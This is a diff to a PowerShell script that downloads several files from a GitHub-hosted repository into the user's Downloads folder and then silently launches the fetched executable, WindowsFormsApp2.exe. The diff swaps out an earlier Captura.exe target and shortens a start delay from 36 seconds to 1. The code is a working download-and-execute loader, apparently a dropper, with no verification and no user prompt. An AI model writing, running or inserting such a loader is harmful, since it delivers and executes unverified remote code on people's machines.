@@ -1,10 +1,13 @@
 $urls = @(
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/video.mp4",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
 )
 
 $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
 
-Start-Sleep -Seconds 36
+Start-Sleep -Seconds 1
 
 $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
 if (-not (Test-Path -Path $downloadDir)) {
@@ -17,5 +20,5 @@ foreach ($url in $urls) {
     Invoke-WebRequest -Uri $url -OutFile $destinationPath
 }
 
-$exePath = Join-Path -Path $downloadDir -ChildPath "Captura.exe"
+$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
 Start-Process -FilePath $exePath
